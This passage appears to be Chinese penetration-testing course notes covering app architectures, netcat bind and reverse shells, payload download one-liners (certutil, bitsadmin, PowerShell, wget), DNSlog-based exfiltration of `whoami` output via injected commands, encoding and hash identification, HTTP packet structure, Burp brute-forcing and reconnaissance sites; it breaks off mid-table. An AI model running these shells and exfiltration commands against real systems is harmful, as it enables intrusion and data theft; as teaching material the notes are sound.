<p>安卓一般使用java语言开发，当然现在也有kotlin语言进行开发。如何开发就涉及到具体编程了，这里就不详说了。简单描述就是使用安卓提供的一系列控件来实现页面，复杂点的页面可以通过自定义控件来实现。</p>
<p>2、使用H5语言开发</p>
<p>使用H5开发的好处有很多，可多端复用，比如浏览器端，ios端，当然H5开发的体验是没有原生好的。结合我做过的项目来说，一般是这个页面需要分享出去的话，就用H5开发。</p>
<p>3、使用flutter开发</p>
<p>flutter是近年来谷歌推出的一款UI框架，使用dart语言进行开发，支持跨平台，weight渲染直接操作硬件层，体验可媲美原生。但是flutter技术比较新，生态还不完善，开发起来效率相对偏低。</p>
<p>4、常规Web开发</p>
<p>Web App软件开发简单地说，就是开发一个网站，然后加入app的壳。Web App一般非常小，内容都是app内的网页展示，受制于网页技术本身，可实现功能少，而且每次打开，几乎所有的内容都需要重新加载，所以反应速度慢，内容加载过多就容易卡死，用户体验差，而且app内的交互设计等非常有效。但开发周期长端，需要的技术人员少，成本低。</p>
<p>#APP-开发架构-原生态-IDEA</p>
<p>演示：remusic项目源码</p>
<p>安全影响：反编译&amp;抓包&amp;常规测试</p>
<p>安全影响：逆向的角度去分析逻辑设计安全</p>
<p>#APP-开发架构–Web封装-封装平台</p>
<p>演示：ShopXO源码程序+一门APP打包</p>
<p>安全影响：常规Web安全测试</p>
<p>#APP-开发架构-H5&amp;Vue-HBuilderX</p>
<p>演示：HBuilderX案例</p>
<p>安全影响：API&amp;JS框架安全问题&amp;JS前端测试</p>
<p>#WX小程序-开发架构-Web封装-平台</p>
<p>演示：ShopXO源码程序+一门APP打包</p>
<p>安全影响：常规Web安全测试</p>
<p>#WX小程序-开发架构-H5&amp;Vue-HBuilderX</p>
<p>演示：HBuilderX案例</p>
<p>安全影响：API&amp;JS框架安全问题&amp;JS前端测试</p>
<h1 id="反弹SHELL"><a href="#反弹SHELL" class="headerlink" title="反弹SHELL"></a>反弹SHELL</h1><p>（攻击者视角）</p>
<p>正向连接：客户端进行监听本地端口，攻击者主动发送请求与客户端建立连接</p>
<p>反向连接：攻击者进行监听本地端口，客户端主动发送请求与攻击者建立连接</p>
<p>命令生成：<a href="https://forum.ywhack.com/shell.php">https://forum.ywhack.com/shell.php</a></p>
<p>新版反弹：<a href="https://forum.ywhack.com/reverse-shell/">https://forum.ywhack.com/reverse-shell/</a></p>
<p><strong>eg.Linux控制windows</strong></p>
<p>①正向连接：</p>
<p>Linux： nc 192.168.138.130 5566</p>
<p>windows：nc -e cmd -lvvp 5566</p>
<img src="/img/xiaodi/image-20250420163653315.png" alt="image-20250420163653315" style="zoom: 50%;" />

<p>②反向连接：</p>
<p>Linux： nc -lvvp 5566</p>
<p>Windows：nc -e cmd 192.168.138.141 5566</p>
<img src="/img/xiaodi/image-20250420164123747.png" alt="image-20250420164123747" style="zoom:50%;" />

<h2 id="防火墙出入站"><a href="#防火墙出入站" class="headerlink" title="防火墙出入站"></a>防火墙出入站</h2><p>①当防火墙入站规则被进行过滤</p>
<p>阻止5566端口的入站规则</p>
<p>思路：攻击者监听本地端口，客户端主动连接攻击者</p>
<p>client：nc.exe -e cmd 192.168.138.141 5566</p>
<p>hacker：nc -lvvp 5566</p>
<img src="/img/xiaodi/image-20250420165620592.png" alt="image-20250420165620592" style="zoom:50%;" />



<p>注意：防火墙默认对出站过滤检测并不严格，对入站规则过滤检测较为严格（默认阻止入站连接，默认允许出站连接）</p>
<p>②当防火墙出站规则被进行过滤</p>
<p>阻止5566端口的出站规则（前提条件：允许5566的入站规则）</p>
<p>思路：客户端监听本地端口，攻击者主动连接客户端</p>
<p>client：nc.exe -e cmd -lvvp 5566</p>
<p>hacker：nc 192.168.138.132 5566	</p>
<p><img src="/img/xiaodi/image-20250420170553445.png" alt="image-20250420170553445"></p>
<h1 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h1><p>文件下载命令生成：<a href="https://forum.ywhack.com/bountytips.php?download">https://forum.ywhack.com/bountytips.php?download</a></p>
<p>Linux：wget curl python ruby perl java 等</p>
<p>Windows：PowerShell Certutil Bitsadmin msiexec mshta rundll32 等</p>
<p>Windows常用：</p>
<p>​	</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">powershell.exe -Command &quot;Invoke-WebRequest -Uri http://127.0.0.1:8080/test.exe -OutFile exploit.exe&quot;</span><br><span class="line"></span><br><span class="line">certutil.exe -urlcache -split -f http://127.0.0.1:8080/test.exe exploit.exe</span><br><span class="line"></span><br><span class="line">bitsadmin /rawreturn /transfer down &quot;http://127.0.0.1:8080/test.exe&quot; c:\\exploit.exe</span><br><span class="line"></span><br><span class="line">msiexec /q /i http://127.0.0.1:8080/test.exe</span><br></pre></td></tr></table></figure>





<p>Linux常用：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget http://127.0.0.1:8080/test.exe -O exploit.exe</span><br><span class="line"></span><br><span class="line">curl http://127.0.0.1:8080/test.exe -o exploit.exe</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="数据不回显"><a href="#数据不回显" class="headerlink" title="数据不回显"></a>数据不回显</h1><p><img src="/img/xiaodi/image-20250420173346329.png" alt="image-20250420173346329"></p>
<p>使用数据访问外部DNSLOG的方式外带</p>
<p>常用dnslog：</p>
<ul>
<li><a href="http://ceye.io/">http://ceye.io</a></li>
<li><a href="http://www.dnslog.cn/">http://www.dnslog.cn/</a></li>
<li><a href="http://eyes.sh/dns/">http://eyes.sh/dns/</a></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">管道符：| (管道符号) ||（逻辑或） &amp;&amp;（逻辑与） &amp;(后台任务符号)</span><br><span class="line"><span class="meta prompt_">	Windows-&gt;</span><span class="language-bash">| &amp; || &amp;&amp;</span></span><br><span class="line"><span class="meta prompt_">	Linux-&gt;</span><span class="language-bash">; | || &amp; &amp;&amp; ``(特有``和;)</span></span><br></pre></td></tr></table></figure>



<p>Linux常用外带方法：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl http://haha.xxx.ceye.io/`whoami`</span><br><span class="line"></span><br><span class="line">ping `whoami`.xxxx.ceye.io</span><br><span class="line"></span><br><span class="line">ping $(whoami).dyy8n3.dnslog.cn</span><br><span class="line"></span><br><span class="line">whois -h 192.168.233.128 -p 8888 `whoami`</span><br></pre></td></tr></table></figure>



<p>Windows外带方法：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ping %USERNAME%.GoldY.eyes.sh</span><br><span class="line"></span><br><span class="line">for /F &quot;delims=\&quot; %i in (&#x27;whoami&#x27;) do ping %i.91pjgw.dnslog.cn</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">需要vpc开启一个http服务</span></span><br><span class="line">for /F &quot;delims=&quot; %i in (&#x27;whoami&#x27;) do curl http://192.168.43.190:8000/%i</span><br></pre></td></tr></table></figure>







<h1 id="编码与加解密"><a href="#编码与加解密" class="headerlink" title="编码与加解密"></a>编码与加解密</h1><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p><a href="https://www.inkomet.com/detail.php?id=MQ==">https://www.inkomet.com/detail.php?id=MQ==</a></p>
<p>进行测试的的语句：</p>
<p><a href="https://www.inkomet.com/detail.php?id=2">https://www.inkomet.com/detail.php?id=2</a> ——–&gt;  没有正确的回显</p>
<p><a href="https://www.inkomet.com/detail.php?id=Mg==">https://www.inkomet.com/detail.php?id=Mg==</a> ———&gt; 正确回显</p>
<p>数据在传输的时候进行编码 为什么要了解?</p>
<p>服务器在接受参数的可能会进行解码再带入，如果payload没有进行同样的编码，出入后端的数据就无法进行有效的测试</p>
<p>正确:测试的话也要进行pay1oad同样的加密或编码进行提交</p>
<p>安全测试漏洞时候 通常都会进行数据的修改增加提交测试</p>
<p>场景：登录的数据包</p>
<p>admin 123456</p>
<p>username&#x3D;admin&amp;password&#x3D;e10adc3949ba59abbe56e057f20f883e<br>如果现在我要进行密码的破解爆破</p>
<p>字典文件:<br>    帐号什么都不用更改 去替换username&#x3D;值即可</p>
<p>​	密码需要进行密码算法 保证和password&#x3D;值同等加密才行</p>
<h2 id="加解密"><a href="#加解密" class="headerlink" title="加解密"></a>加解密</h2><h3 id="针对对象"><a href="#针对对象" class="headerlink" title="针对对象"></a>针对对象</h3><h4 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h4><p><strong>传输数据：</strong></p>
<p>​	加密：md5</p>
<p>​	编码：base64</p>
<p>通常根据数据加密或编码的数据，进行相应payload加密或编码后，进行漏洞探测发现（漏洞探针）</p>
<p><strong>数据格式：</strong>	</p>
<ul>
<li>常规方式</li>
<li>JSON</li>
<li>XML</li>
</ul>
<p>在数据包使用不同数据格式时候，需要对payload进行相应的数据格式转换（发送漏洞探针，回显数据分析）</p>
<p><strong>产品</strong></p>
<p>不同的web网站可能采用的数据方式并不一致：如CMS Discuz不同版本采用不同的加密方式（MD5+salt、使用password_hash()函数进行加密）</p>
<p>密文存储加密方式：</p>
<ul>
<li>MD5</li>
<li>MD5+SALT</li>
<li>AES</li>
<li>DES</li>
</ul>
<h4 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h4><p>只要针对后测试</p>
<p>1、Windows</p>
<p>在Win10之前（包括win10）使用的用户密码加密方式为NTML</p>
<p>2、Linux</p>
<p>使用的是md5+salt方式进行存储用户密码</p>
<p>一般情况难以进行破解</p>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><ul>
<li>java</li>
<li>.net</li>
<li>安卓</li>
<li>ios</li>
</ul>
<p>有时为了保护源代码可能会对代码进行二次加密</p>
<p><a href="https://www.phpencode.cn/free_sg">千古互动 免费PHP加密 - SG11,SG13,SG14,SG15,Phpencode.cn,SG11加密平台,PHP加密平台,免费PHP加密,PHP在线加密</a></p>
<p><a href="https://yours.tools/zh/enphp.html">php在线混淆加密,支持php5和php7代码在线加密混淆-在线工具网</a></p>
<p><img src="/img/xiaodi/1745501662219.png" alt="1745501662219"></p>
<h3 id="逆向思路"><a href="#逆向思路" class="headerlink" title="逆向思路"></a>逆向思路</h3><p>1、看密文的特征分析算法</p>
<p>2、获取源码分析算法（后端加密）</p>
<p>3、JS前端进行加密（前端加密）</p>
<h3 id="识别并解密"><a href="#识别并解密" class="headerlink" title="识别并解密"></a>识别并解密</h3><blockquote>
<ol>
<li><p>单向散列加密 -MD5<br>单向散列加密算法的优点有(以MD5为例)：<br>方便存储，损耗低：加密&#x2F;加密对于性能的损耗微乎其微。<br>单向散列加密的缺点就是存在暴力破解的可能性，最好通过加盐值的方式提高安全性，此外可能存在散列冲突。我们都知道MD5加密也是可以破解的。<br>常见的单向散列加密算法有：<br>MD5 SHA MAC CRC</p>
</li>
<li><p>对称加密 -AES<br>对称加密优点是算法公开、计算量小、加密速度快、加密效率高。<br>缺点是发送方和接收方必须商定好密钥，然后使双方都能保存好密钥，密钥管理成为双方的负担。<br>常见的对称加密算法有：<br>DES AES RC4</p>
</li>
<li><p>非对称加密 -RSA<br>非对称加密的优点是与对称加密相比，安全性更好，加解密需要不同的密钥，公钥和私钥都可进行相互的加解密。<br>缺点是加密和解密花费时间长、速度慢，只适合对少量数据进行加密。<br>常见的非对称加密算法：<br>RSA RSA2 PKCS</p>
</li>
</ol>
</blockquote>
<p>MD5密文特点：<br>1、由数字“0-9”和字母“a-f”所组成的字符串<br>2、固定的位数 16 和 32位<br>解密需求：密文即可，但复杂明文可能解不出</p>
<p>BASE64编码特点：<br>0、大小写区分，通过数字和字母的组合<br>1、一般情况下密文尾部都会有两个等号，明文很少的时候则没有<br>2、明文越长密文越长，一般不会出现”&#x2F;“”+”在密文中</p>
<p>AES、DES密文特点：<br>同BASE64基本类似，但一般会出现”&#x2F;“和”+”在密文中<br>解密需求：密文，模式，加密Key，偏移量，条件满足才可解出</p>
<p>RSA密文特点：<br>特征同AES,DES相似，但是长度较长<br>解密需求：密文，公钥或私钥即可解出</p>
<p>​	</p>
<h1 id="数据传输格式"><a href="#数据传输格式" class="headerlink" title="数据传输格式"></a>数据传输格式</h1><p><strong>在进行安全测试时，通过使用抓包工具进行抓包，必须按照目标系统的数据格式发送数据，否则会导致测试无效。</strong></p>
<h2 id="常规格式"><a href="#常规格式" class="headerlink" title="常规格式"></a>常规格式</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">username=admin&amp;password=e10adc3949ba59abbe56e057f20f883e</span><br></pre></td></tr></table></figure>



<p>最常使用的数据包传输格式，使用&amp;符号进行连接不同的参数值</p>
<h2 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h2><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;10&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;课程&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;items&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">	<span class="punctuation">&#123;</span><span class="attr">&quot;itemId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;20&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;itemName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;数学&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="punctuation">&#123;</span><span class="attr">&quot;itemId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;21&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;itemName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;化学&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>JSON是一种轻量级的数据交换格式，易于阅读和编写，广泛应用于Web应用程序中。它的优点包括易于解析和生成，支持多种编程语言，数据结构简单且可嵌套。然而，JSON的数据体积相对较大。</p>
<h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;students&gt;</span><br><span class="line">&lt;student id=&quot;001&quot;&gt;</span><br><span class="line">&lt;name&gt;微信1&lt;/name&gt;</span><br><span class="line">&lt;学号&gt;20140101&lt;/学号&gt;</span><br><span class="line">&lt;地址&gt;广州&lt;/地址&gt;</span><br><span class="line">&lt;座右铭&gt;要么强大，要么听话&lt;/座右铭&gt;</span><br><span class="line">&lt;/student&gt;</span><br><span class="line">&lt;student id=&quot;002&quot;&gt;</span><br><span class="line">&lt;name&gt;微博1&lt;/name&gt;</span><br><span class="line">&lt;学号&gt;20140102&lt;/学号&gt;</span><br><span class="line">&lt;地址&gt;广州&lt;/地址&gt;</span><br><span class="line">&lt;座右铭&gt;在哭泣中学会坚强&lt;/座右铭&gt;</span><br><span class="line">&lt;/student&gt;</span><br><span class="line">&lt;/students&gt;</span><br></pre></td></tr></table></figure>

<p>XML是一种可扩展的标记语言，用于描述和传输结构化数据，常用于Web服务和配置文件中。它具有自我描述性和可扩展性，适用于复杂数据结构和文档的交换。然而，XML标签冗余，数据体积较大，解析和生成相对复杂。</p>
<h1 id="HTTP数据包"><a href="#HTTP数据包" class="headerlink" title="HTTP数据包"></a>HTTP数据包</h1><h2 id="HTTP请求方法"><a href="#HTTP请求方法" class="headerlink" title="HTTP请求方法"></a>HTTP请求方法</h2><p>利用HTTP访问网站都有哪些请求方法，请求方法对应特点？<br>GET: 		直接获取网站资源<br>POST：		客户端有信息要提交到服务端时（登录 搜索）<br>HEAD:		类似GET方法，不会返回响应主体信息<br>PUT：		用来将本地资源上传到服务端<br>OPTIONS:	用来检测服务端可以接收哪些访问请求（安全）<br>TRACE:		可以在响应报文中，看到请求报文的内容	</p>
<h2 id="HTTP请求报文信息"><a href="#HTTP请求报文信息" class="headerlink" title="HTTP请求报文信息"></a>HTTP请求报文信息</h2><img src="/img/xiaodi/image-20250506205343605.png" alt="image-20250506205343605" style="zoom:50%;" />

<p><strong>第一部分：请求行信息</strong><br>1）请求方法信息：GET POST PUT HEAD …<br>2）请求资源信息：<br>   host（访问网站域名&#x2F;地址&#x2F;端口）+请求资源<br>   host: 确认访问站点目录<br>   请求资源：三种情况<br>   1 正常请求资源- oldboy.jpg<br>   2 默认请求-&#x2F; &#x2F;admin&#x2F; 请求首页文件-index.html index.php index.jsp<br>   3 访问代码资源需要传入参数</p>
<p>   协议（HTTP&#x2F;HTTPS&#x2F;FTP）+host（访问网站域名&#x2F;地址&#x2F;端口）+请求资源  – 请求信息 &#x3D;&#x3D; URL</p>
<p>   URL(Uniform Resource Locator，统一资源定位符),是标识Web资源的唯一标识符.通过它即可获取其标识的资源。</p>
<p>3）请求HTTP版本信息（1.1 2.0）<br>1.0 属于TCP短连接访问  		一次连接对应一次请求<br>1.1 属于TCP长连接访问  		一次连接对应多次请求<br>2.0 可以实现并发请求处理    适合电商网站</p>
<p><strong>第二部分：请求头信息</strong><br>请求过程各种字段信息：<br>Accept: 	确认客户端请求资源类型信息<br>Referer：	消息头用于表示发出请求的原始URL；告知服务端是从哪访问过来的	（*****）<br>            有referer：可以获得跳转源url地址信息（记录推广次数）<br>            无referer：代表直接访问网站资源</p>
<pre><code>        视频网站：视频无法下载 会员登录 http://www.aiqiyi.com/vip/xxx  -- vip电影 
                                         http://www.aiqiyi.com/            vip电影6分钟
                                         
        修改请求信息：添加referer：http://www.aiqiyi.com/vip/xxx  
</code></pre>
<p>Accept-Language：请求返回语言字符信息<br>User-Agent：消息头提供与浏览器或其他生成请求的客户端软件有关的信息；获取客户端指纹信息&#x2F;客户端访问浏览器信息（<em><strong><strong>）<br>Accept-Encoding：浏览器支持的压缩编码是 gzip 和 deflate<br>Cookie：消息头用于提交服务器向客户端发布的其他参数							（</strong></strong></em>）<br>        HTTP属于无状态访问方式，不会记录访问者的身份信息，都需要输入用户名和密码<br>        利用cooke记住用户访问情况：避免反复登录网站</p>
<pre><code>    cookie类型：
    会话cookie：临时产生或短期应用
    长期cookie：一般互联网网站
    
    cookie属性：
    secure：	如果设置这个属性.则仅在HTTPS请求中提交cookie.  （*****）
    Httponly：	如果设置这个属性，将无法通过客户端JavaScript直接访问cookie.
                
                服务 识别用户访问行为  
                抖音网站 -- cookie 123
                cookie 123 视频--美女   记录123 美女 
                cookie 123 视频--美女   记录123 美女
                cookie 123 视频--美女   记录123 美女  
                推广 美女居多  体育  jd 苹果电脑 -- 苹果
</code></pre>
<p>Connection：     表示持久的客户端与服务连接；定义客户端与服务建立TCP连接方式（短连接&#x2F;长连接）<br>X_FORWARDED_FOR：可以获取真实客户端IP地址信息；可以伪装自己客户端地址；<br>                 请求头里面添加X_FORWARDED_FOR<br>                 是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段</p>
<p>空行<br><strong>第三个部分：请求主体信息</strong><br>一般是利用post方法进行请求时，会含有请求主体信息（默认HTTP访问会已明文信息显示）</p>
<h2 id="HTTP响应报文信息"><a href="#HTTP响应报文信息" class="headerlink" title="HTTP响应报文信息"></a><strong>HTTP响应报文信息</strong></h2><p>第一个部分：响应行（起始行）信息<br>1）HTTP&#x2F;1.1 响应的HTTP协议版本信息<br>2）200 状态码：返回请求结果<br>   常用状态码分类：<br>   1xx：提供信息（需要客户端提供信息）<br>   2xx：请求被成功提交，并能够正确处理请求<br>   3xx：客户端被重定向到其他资源	（重要部分）<br>   4xx：请求包含某种错误			（客户端请求异常） – 显示错误页面<br>   5xx：服务器执行请求时遇到错误	（服务端响应异常） – 检查服务端配置</p>
<p>   常用状态有什么：面试问到<br>   100 Continue：			表示服务端收到了客户端的请求信息（POST），但是没有收到请求主体信息<br>   200 OK:					本状态码表示已成功提交请求，且响应主体中包含请求结果。<br>   201 Created:				客户端进行PUT请求时，有数据文件上传到服务端成功后，会响应201状态码信息<br>   301 Moved Permanently：	本状态码将浏览器永久重定向到另外一个在Location消息头中指定的URL。以后客户端应使用新URL替换原始URL。<br>   302 Found				本状态码将浏览器暂时重定向到另外一个在Location消息头中指定的URL.客户端应在随后的请求中恢复使用原始URL.<br>    PS：网站页面跳转，可以对协议 对域名 对资源信息做跳转处理，以便用户在访问旧的资源信息时，可以获取到新的资源信息<br>   304 Not Modified。       本状态码指示浏览器使用缓存中保存的所请求资源的副本。服务器使用If-Modified-Since与工If-None-Match消息头确定客户端是否拥有最新版本的资源。</p>
<p>   401 Unauthorized.		服务器在许可请求前要求HTTP进行身份验证。WWW-Authenticate消息头详细说明所支持的身份验证类型。<br>                            参考链接：<a href="https://blog.csdn.net/chj_1224365967/article/details/113946038">https://blog.csdn.net/chj_1224365967/article/details/113946038</a><br>                            第一步：编写配置文件<br>                            第二步：创建用户密码文件<br>                            第三步：重启nginx							<br> 403 Forbidden			本状态码指出，不管是否通过身份验证，禁止任何人访问被请求的资源。<br>                            参考链接：<a href="https://blog.csdn.net/yxhxj2006/article/details/121623574">https://blog.csdn.net/yxhxj2006/article/details/121623574</a><br>                            访问首页文件不存在，也会出现此状态码<br> 404 Not Found。			本状态码表示所请求的资源并不存在。<br> 405 Method Not Allowed	本状态码表示指定的URL不支持请求中使用的方法。例如，如果试图在不支持PUT方法的地方使用该方法，就会收到本状态码。<br>                            服务端做了请求方法限制</p>
<p>   500 Internal Server Error	本状态码表示服务器在执行请求时遇到错误。当提交无法预料的输人、在应用程序处理过程中造成无法处理的错误时，通常会收到本状态码。<br>                                应该仔细检查服务器响应的所有内容，了解与错误性质有关的详情。<br>                                PS：检查访问网站代码逻辑（代码审计）<br> 503 Service Unavailable。	通常，本状态码表示尽管Web服务器运转正常.并且能够响应请求，但服务器访问的应用程序还是无法作出响应。应该进行核实，是否因为执行了某种行为而造成这个结果。<br>   502                          PS：需要访问后端数据库服务，但是后端数据库服务没有响应</p>
<p><strong>第二个部分：响应头信息</strong><br><img src="/img/xiaodi/image-20250506205521065.png" alt="image-20250506205521065"></p>
<p><strong>第三个部分：响应主体信息</strong><br>响应HTML代码信息，浏览器识别HTML代码加载页面</p>
<h2 id="跨平台测试注意事项"><a href="#跨平台测试注意事项" class="headerlink" title="跨平台测试注意事项"></a>跨平台测试注意事项</h2><p>在不同终端测试时，必须保证数据包结构与目标平台完全一致</p>
<p>eg.不同的设备访问同一web界面返回不一致</p>
<ul>
<li><p>移动设备和PC访问同一接口可能返回不同数据</p>
</li>
<li><p>识别依据：User-Agent字段是主要设备标识</p>
</li>
<li><p>解决方法修改请求头模拟移动设备访问</p>
<ul>
<li>需要完整复制移动端的请求头参数</li>
<li>特别是Android版本和设备型号信息</li>
<li>缺少移动端特有参数会导致403错误</li>
</ul>
</li>
</ul>
<p><strong>根据状态码判断是否存在该文件或路径</strong></p>
<ul>
<li>文件存在判断：返回200表示文件存在且可访问；返回404表示文件不存在。</li>
<li>文件夹存在判断：返回403表示文件夹存在但无索引文件；若文件夹下有默认索引文件（如index.php），则返回200。</li>
<li>重定向判断：30X状态码可能表示文件存在触发跳转，也可能是不存在时的容错跳转，需结合具体情况分析。</li>
</ul>
<p><strong>burp进行目录爆破方法</strong></p>
<ul>
<li><p>操作流程</p>
<ul>
<li>抓取目标网站请求包</li>
<li>在路径末尾添加变量标记（如§）</li>
<li>载入路径字典文件（包含_system、user等常见路径）</li>
<li>设置5个并发线程进行扫描</li>
</ul>
</li>
<li><p>结果分析：通过对比状态码（200&#x2F;403&#x2F;404）识别有效路径，如index.php返回200表示存在</p>
</li>
</ul>
<p> <strong>登录爆破技术</strong></p>
<ul>
<li><p>双重验证机制：发现系统同时验证明文密码和MD5加密密码，两者需同时正确才能登录</p>
</li>
<li><p>爆破技巧</p>
<ul>
<li>使用Burp的Payload Processing功能自动生成MD5值</li>
<li>通过状态码差异判断（302跳转为成功，500为失败）</li>
<li>实际测试发现只需加密密码正确即可绕过验证</li>
</ul>
</li>
<li><p>实战验证：通过修改数据包中的password_md5字段为已知MD5值成功登录</p>
</li>
</ul>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>小迪安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>小迪安全</tag>
      </tags>
  </entry>
  <entry>
    <title>小迪安全--信息打点(2)</title>
    <url>/posts/dba72746.html</url>
    <content><![CDATA[<h1 id="业务资产"><a href="#业务资产" class="headerlink" title="业务资产"></a>业务资产</h1><p>查询平台：</p>
<table>
<thead>
<tr>
<th>小蓝本</th>
<th><a href="https://www.xiaolanben.com/">https://www.xiaolanben.com/</a></th>
</tr>
</thead>
<tbody><tr>
<td>爱企查</td>
<td><a href="https://aiqicha.baidu.com/">https://aiqicha.baidu.com/</a></td>
</tr>
</tbody></table>
<p>业务类型</p>
<p>WEB 应用 2. APP 应用 3. PC 端应用 4. 小程序应用 5. 微信公众号 6. 其他产品等</p>
<h1 id="Web应用"><a href="#Web应用" class="headerlink" title="Web应用"></a>Web应用</h1><p>工具大全</p>
<p>[<a href="https://forum.ywhack.com/bountytips.php?tools">~]#棱角 ::Edge.Forum</a></p>
<p><strong>主要资产内容</strong></p>
<ol>
<li>WEB 应用 2. APP 应用 3. PC 端应用 4. 小程序应用 5. 微信公众号 6. 其他产品等</li>
</ol>
<p>查询工具：</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>地址</th>
</tr>
</thead>
<tbody><tr>
<td>天眼查</td>
<td><a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></td>
</tr>
<tr>
<td>小蓝本</td>
<td><a href="https://www.xiaolanben.com/">https://www.xiaolanben.com/</a></td>
</tr>
<tr>
<td>爱企查</td>
<td><a href="https://aiqicha.baidu.com/">https://aiqicha.baidu.com/</a></td>
</tr>
<tr>
<td>企查查</td>
<td><a href="https://www.qcc.com/">https://www.qcc.com/</a></td>
</tr>
<tr>
<td>国外企查</td>
<td><a href="https://opencorporates.com/">https://opencorporates.com/</a></td>
</tr>
<tr>
<td>启信宝</td>
<td><a href="https://www.qixin.com/">https://www.qixin.com/</a></td>
</tr>
</tbody></table>
<p><strong>查询重点</strong></p>
<ul>
<li>业务方向：网站、APP、PC端应用、小程序、微信公众号等</li>
<li>知识产权：域名、商标、专利等</li>
<li>关联企业：分公司、子公司等关联企业信息</li>
</ul>
<p>公众号信息</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>地址</th>
</tr>
</thead>
<tbody><tr>
<td>搜狗微信搜索</td>
<td><a href="https://weixin.sogou.com/">https://weixin.sogou.com/</a></td>
</tr>
</tbody></table>
<h2 id="Web单域名"><a href="#Web单域名" class="headerlink" title="Web单域名"></a>Web单域名</h2><ol>
<li>备案信息 2. 企业产权 3. 注册域名 4. 反查解析</li>
</ol>
<h3 id="备案信息"><a href="#备案信息" class="headerlink" title="备案信息"></a>备案信息</h3><table>
<thead>
<tr>
<th>名称</th>
<th>地址</th>
</tr>
</thead>
<tbody><tr>
<td>备案信息查询</td>
<td><a href="http://www.beianx.cn/">http://www.beianx.cn/</a></td>
</tr>
<tr>
<td>备案管理系统</td>
<td><a href="https://beian.miit.gov.cn/">https://beian.miit.gov.cn/</a></td>
</tr>
</tbody></table>
<p>查询备案信息方法：</p>
<ul>
<li>通过业务资产方法查询到的备案信息</li>
<li>备案信息查询</li>
<li>门户网站最底部</li>
</ul>
<p>未备案的域名无法进行查询</p>
<h3 id="注册域名"><a href="#注册域名" class="headerlink" title="注册域名"></a>注册域名</h3><table>
<thead>
<tr>
<th>名称</th>
<th>地址</th>
</tr>
</thead>
<tbody><tr>
<td>域名注册查询</td>
<td><a href="https://buy.cloud.tencent.com/domain">https://buy.cloud.tencent.com/domain</a></td>
</tr>
<tr>
<td>备案信息查询</td>
<td><a href="https://beian.miit.gov.cn/">https://beian.miit.gov.cn/</a></td>
</tr>
</tbody></table>
<p><strong>查询内容</strong></p>
<ul>
<li>目标企业注册的所有域名</li>
<li>域名注册时间、到期时间</li>
<li>域名持有人信息</li>
</ul>
<h3 id="IP-反查"><a href="#IP-反查" class="headerlink" title="IP 反查"></a>IP 反查</h3><p>根据获取到的IP进行反向查询域名信息</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>地址</th>
</tr>
</thead>
<tbody><tr>
<td>IP 反查域名</td>
<td><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></td>
</tr>
<tr>
<td>IP 反查域名</td>
<td><a href="http://dns.bugscaner.com/">http://dns.bugscaner.com/</a></td>
</tr>
</tbody></table>
<h2 id="Web子域名"><a href="#Web子域名" class="headerlink" title="Web子域名"></a>Web子域名</h2><ol>
<li>DNS 数据 2. 证书查询 3. 网络空间 4. 威胁情报 5. 枚举解析</li>
</ol>
<h3 id="DNS-数据"><a href="#DNS-数据" class="headerlink" title="DNS 数据"></a>DNS 数据</h3><table>
<thead>
<tr>
<th>名称</th>
<th>地址</th>
</tr>
</thead>
<tbody><tr>
<td>dnsdumpster</td>
<td><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></td>
</tr>
</tbody></table>
<h3 id="证书查询"><a href="#证书查询" class="headerlink" title="证书查询"></a>证书查询</h3><table>
<thead>
<tr>
<th>名称</th>
<th>地址</th>
</tr>
</thead>
<tbody><tr>
<td>CertificateSearch</td>
<td><a href="https://crt.sh/">https://crt.sh/</a></td>
</tr>
</tbody></table>
<h3 id="网络空间"><a href="#网络空间" class="headerlink" title="网络空间"></a>网络空间</h3><table>
<thead>
<tr>
<th>名称</th>
<th>地址</th>
</tr>
</thead>
<tbody><tr>
<td>FOFA</td>
